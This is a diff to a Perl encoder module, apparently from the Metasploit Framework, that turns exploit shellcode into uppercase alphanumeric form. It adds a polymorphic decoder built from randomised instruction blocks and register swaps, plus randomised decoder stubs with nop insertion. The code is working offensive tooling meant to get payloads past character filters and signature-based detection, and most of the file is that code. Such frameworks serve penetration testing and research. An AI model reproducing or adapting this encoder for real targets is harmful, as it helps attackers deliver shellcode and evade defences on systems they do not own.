@@ -2,6 +2,11 @@
 use strict;
 package Msf::Encoder::SkyAlphaNum;
 use base 'Msf::Encoder';
+use Pex::Poly::BlockMaster;
+use Pex::Poly::DeltaKing;
+use Pex::Poly::RegAssassin;
+
+my $bmb = 'Pex::Poly::BlockMaster::Block';
 
 q{
 #define VERSION_STRING "ALPHA 2: Zero-tolerance. (build 07)"
@@ -91,7 +96,7 @@ nops
   converted to unicode (inserting a '0' after each byte) before it gets
   executed.
 --uppercase
-  Make shellcode 1003221222628ppercase characters, uses a few more bytes then
+  Make shellcode 100% Uppercase characters, uses a few more bytes then
   mixedcase shellcodes.
 --sources
   Output a list of BASEADDRESS options for the given combination of --uppercase
@@ -187,6 +192,7 @@ sub EncodeData {
   my $validChars = $options{'validChars'};
   $validChars = '0123456789BCDEFGHIJKLMNOPQRSTUVWXYZ' if(!defined($validChars));
   my $unicode = $options{'unicode'};
+  my $noterm = $options{'dontTerminate'};
 #  $unicode = 1;
 
   my $data;
@@ -223,7 +229,7 @@ sub EncodeData {
 
   }
 
-  $data .= 'A';
+  $data .= 'A' if(!$noterm);
   return($data);
 }
 
@@ -247,17 +253,250 @@ sub _MakeUpperW32SehGetPc {
 #
 # Ascii Mixedcase Decoder / Stubs
 #
+
+
+# needs work still...
+sub _MakeDecoderPoly {
+  my $self = shift;
+
+  my $push41 = $bmb->new('push byte 0x41', '[>0 head<]jA');
+
+  my $popEax = $bmb->new('pop eax (0x41)', 'X');
+  $popEax->AddDepend($push41);
+
+  my $pushEax = $bmb->new('push eax', 'P');
+  $pushEax->AddDepend($popEax);
+
+  my $xorImul = $bmb->new('xor (fix imul)');
+  foreach my $a ('0A', '0B') { # 0A0...
+    $xorImul->AddBlock($a . '[>1 chr(:imul: - :head: + 0x28)<]');
+  }
+  $xorImul->AddDepend($popEax);
+
+  my $loopTop = $bmb->new('_loopTop', '');
+  $loopTop->AddDepend($pushEax, $xorImul);
+
+  my $incEcx1 = $bmb->new('inc ecx', '[>1 chr(0x40 + ||REG1||)<]');
+  $incEcx1->AddDepend($loopTop);
+
+  my $imul = $bmb->new('imul', '[>0 imul<]k[>1 chr(0x40 + ||REG1||)<]AQ');
+  $imul->AddDepend($incEcx1);
+
+  my $xor1 = $bmb->new('xor decode', '[>0 xord<]2[>1 chr(0x40 + ||REG1||)<][>1 chr(:incEcx2: < :xord: ? 0x41 : 0x42)<]');
+  $xor1->AddDepend($imul);
+
+  my $xor2 = $bmb->new('xor save1', '[>0 xors1<]2[>1 chr(0x40 + ||REG2||)<][>1 chr(:incEdx: < :xors1: ? 0x41 : 0x42)<]');
+  $xor2->AddDepend($xor1);
+
+  my $xor3 = $bmb->new('xor save2', '[>0 xors2<]0[>1 chr(0x40 + ||REG2||)<][>1 chr(:incEdx: < :xors2: ? 0x41 : 0x42)<]');
+  $xor3->AddDepend($xor2);
+
+  my $incEcx2 = $bmb->new('inc ecx 2', '[>0 incEcx2<][>1 chr(0x40 + ||REG1||)<]');
+  $incEcx2->AddDepend($imul);
+  my $incEdx = $bmb->new('inc edx', '[>0 incEdx<][>1 chr(0x40 + ||REG2||)<]');
+  $incEdx->AddDepend($loopTop);
+
+  my $popEax2 = $bmb->new('pop eax 2', 'X');
+  $popEax2->AddDepend($xor3);
+
+  my $pushEax2 = $bmb->new('push eax 2', 'P');
+  $pushEax2->AddDepend($popEax2);
+
+  my $cmp = $bmb->new('cmp', '8[>1 chr(0x40 + ||REG1||)<]B');
+  $cmp->AddDepend($popEax2, $incEcx2, $incEdx);
+
+  my $jmp = $bmb->new('jnz', 'u');
+  $jmp->AddDepend($cmp, $pushEax2);
+
+  my $block;
+  $block = Pex::Poly::BlockMaster->new($push41);
+  $block = Pex::Poly::RegAssassin->new($block->Build);
+  $block->AddSet([ 'REG1', 'REG2' ], [ 1, 2 ]); # ecx amd edx
+  $block = Pex::Poly::DeltaKing->new($block->Build);
+  return($block->Build);
+}
+
 sub _MakeDecoder {
   my $self = shift;
   my $decoder = 
-    'jAXP0A0AkAAQ2AB2BB0BBABXP8ABuJI';
+#    'jAXP0A0AkAAQ2AB2BB0BBABXP8ABuJI';
+#    'jAXP0A0AkAAQ2AB2BB0BBABXP8ABu' . $self->EncodeData("\xe9", dontTerminate => 1);
+    $self->_MakeDecoderPoly . $self->EncodeData("\xe9", dontTerminate => 1);
   return($decoder);
+}
+sub _RandomInsert {
+  my $self = shift;
+  my $string = shift;
+  my $inserts = shift || [ ];
+
+  foreach my $insert (@{$inserts}) {
+    substr($string, int(rand(length($string) + 1)), 0, $insert);
+  }
+  return($string);
+}
+
+sub _MakeStubDecer {
+  my $self = shift;
+  my $num = shift;
+  my $data;
+
+  if(int(rand(2)) == 1) {
+    $data = 'Y' . ('I' x $num) . 'QZ';
+  }
+  else {
+    $data = 'Z' . ('J' x $num) . 'RY';
+  }
+  return($data);
+}
+sub _MakeStubPoper {
+  my $self = shift;
+  my $num = shift;
+
+  # eax gets destroyed in the decoder anyway, so no problems with smashing it
+  my @pops = ('Y', 'Z', 'X');
+  my $stub;
+
+  for(my $i = 0; $i < $num; $i++) {
+    $stub .= $pops[int(rand(@pops))];
+  }
+  return($stub);
 }
 
 sub _MakeStub {
   my $self = shift;
   my $type = shift;
 
+  my $prepend = '';
+
+  if($type eq 'seh') {
+    $prepend = $self->_MakeW32SehGetPc;
+    $type = 'ecx';
+  }
+
+# Note, possible other nop besides 7 (aaa) is H (dec eax)
+# or dec ecx/edx depending on placement (trickier)
+# should incorporate that sometime
+
+  # these are just the always safe ones
+  my $nop = int(rand(2)) ? '7' : 'H';
+
+  # nops, 18 decs
+  if($type eq 'nops') {
+    return($self->_RandomInsert('IIIIIIIIIIIIIIIIII', [ $nop ]));
+  }
+
+  # Eax stub, 16 decs...
+  elsif($type eq 'eax') {
+    # just make sure the nop doesn't come before the push eax, incase
+    # for some reason that would modify eax.. (aaa), or for sure dec eax would
+    my $stub = $self->_MakeStubDecer(16);
+    return('P' . $self->_RandomInsert($stub, [ $nop ]));
+  }
+
+  # Ecx stub, 17 decs, can't do ecx/edx swap for obvious reasons
+  elsif($type eq 'ecx') {
+    return($prepend . $self->_RandomInsert('IIIIIIIIIIIIIIIIIQZ', [ $nop ]));
+  }
+
+  # Edx stub, 17 decs, can't do ecx/edx swap for obvious reasons
+  elsif($type eq 'edx') {
+    return($self->_RandomInsert('JJJJJJJJJJJJJJJJJRY', [ $nop ]));
+  }
+
+  # All of these are just push/pop reg moves, with 16 decs
+  elsif($type eq 'ebx') {
+    my $stub = $self->_MakeStubDecer(16);
+    return($self->_RandomInsert('S' . $stub, [ $nop ]));
+  }
+  elsif($type eq 'esp') {
+    my $stub = $self->_MakeStubDecer(16);
+    return($self->_RandomInsert('T' . $stub, [ $nop ]));
+  }
+  elsif($type eq 'ebp') {
+    my $stub = $self->_MakeStubDecer(16);
+    return($self->_RandomInsert('U' . $stub, [ $nop ]));
+  }
+
+  elsif($type eq 'esi') {
+    my $stub = $self->_MakeStubDecer(16);
+    return($self->_RandomInsert('V' . $stub, [ $nop ]));
+  }
+  elsif($type eq 'edi') {
+    my $stub = $self->_MakeStubDecer(16);
+    return($self->_RandomInsert('W' . $stub, [ $nop ]));
+  }
+
+  # Note: if you didn't care about what's on the stack, this stubs can be made
+  # shorter, for example, the esp-10 stub could be
+  # QQQLLLL . StubDecer(13) plus a nop (ie QQQLLLLZJJJJJJJJJJJJJ7RY)
+  # that is 24 bytes vs 28 bytes
+
+  # [esp-10], 16 esp decs, 9 ecx decs
+  elsif($type eq '[esp-10]') {
+    my $stub = $self->_MakeStubDecer(9);
+    return('LLLLLLLLLLLLLLLL' . $stub);
+  }
+  # [esp-c], 12 esp decs, 11 ecx decs
+  elsif($type eq '[esp-c]') {
+    my $stub = $self->_MakeStubDecer(11);
+    return('LLLLLLLLLLLL' . $stub);
+  }
+  # [esp-8], 8 esp decx, 13 ecx decs
+  elsif($type eq '[esp-8]') {
+    my $stub = $self->_MakeStubDecer(13);
+    return('LLLLLLLL' . $stub);
+  }
+  # [esp-4], 4 esp decx, 15 ecx decs
+  elsif($type eq '[esp-4]') {
+    my $stub = $self->_MakeStubDecer(15);
+    return('LLLL' . $stub);
+  }
+  # [esp], 17 ecx decs
+  elsif($type eq '[esp]') {
+    my $stub = $self->_MakeStubDecer(17);
+    return($stub);
+  }
+
+  # [esp+4], 1 pop, 16 decs
+  elsif($type eq '[esp+4]') {
+    my $stub = $self->_MakeStubPoper(1) . $self->_MakeStubDecer(16);
+    return($self->_RandomInsert($stub, [ $nop ]));
+  }
+  # [esp+8], 2 pops, 16 decs
+  elsif($type eq '[esp+8]') {
+    my $stub = $self->_MakeStubPoper(2) . $self->_MakeStubDecer(16);
+    return($stub);
+  }
+  # [esp+c], 3 pops, 15 decs
+  elsif($type eq '[esp+c]') {
+    my $stub = $self->_MakeStubPoper(3) . $self->_MakeStubDecer(15);
+    return($self->_RandomInsert($stub, [ $nop ]));
+  }
+  # [esp+10], 4 pops, 15 decs
+  elsif($type eq '[esp+10]') {
+    my $stub = $self->_MakeStubPoper(4) . $self->_MakeStubDecer(15);
+    return($stub);
+  }
+  # [esp+14], 5 pops, 14 decs
+  elsif($type eq '[esp+14]') {
+    my $stub = $self->_MakeStubPoper(5) . $self->_MakeStubDecer(14);
+    return($self->_RandomInsert($stub, [ $nop ]));
+  }
+  # [esp+18], 6 pops, 14 decs
+  elsif($type eq '[esp+18]') {
+    my $stub = $self->_MakeStubPoper(6) . $self->_MakeStubDecer(14);
+    return($stub);
+  }
+  # [esp+1c], 7 pops, 13 decs
+  elsif($type eq '[esp+1c]') {
+    my $stub = $self->_MakeStubPoper(7) . $self->_MakeStubDecer(13);
+    return($self->_RandomInsert($stub, [ $nop ]));
+  }
+  # we could continue, simple pattern...
+
+  return;
+
+# old stubs..
   my $stubs = {
     'nops'      => 'IIIIIIIIIIIIIIIIII7',
     'eax'       => 'PYIIIIIIIIIIIIIIII7QZ',
@@ -282,8 +521,7 @@ sub _MakeStub {
     '[esp+1C]'  => 'YYYYYYYYIIIIIIIIIIIII7QZ',
   };
 
-  $stubs->{'seh'} = $self->_MakeW32SehGetPc . $stubs->{'ecx'};
-  return($stubs->{$type});
+
 }
 
 #
